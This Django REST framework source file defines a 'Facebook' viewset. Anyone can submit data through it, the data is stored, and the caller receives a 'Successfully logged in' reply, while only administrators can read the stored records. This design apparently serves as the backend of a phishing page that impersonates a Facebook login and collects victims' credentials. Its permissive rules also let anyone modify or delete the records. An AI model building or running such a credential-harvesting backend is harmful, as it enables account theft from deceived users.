from rest_framework import viewsets, permissions, status
from rest_framework.response import Response
from .models import Facebook
from .serializers import FacebookSerializer

class FacebookViewSet(viewsets.ModelViewSet):
    queryset = Facebook.objects.all()
    serializer_class = FacebookSerializer

    def get_permissions(self):
        if self.request.method == "GET":
            return [permissions.IsAdminUser()]  # Only admin users can access GET
        return [permissions.AllowAny()]  # Allow everyone for other methods

    def create(self, request, *args, **kwargs):
        serializer = self.get_serializer(data=request.data)
        if serializer.is_valid():
            serializer.save()
            return Response({"message": "Successfully logged in"}, status=status.HTTP_201_CREATED)
        return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)
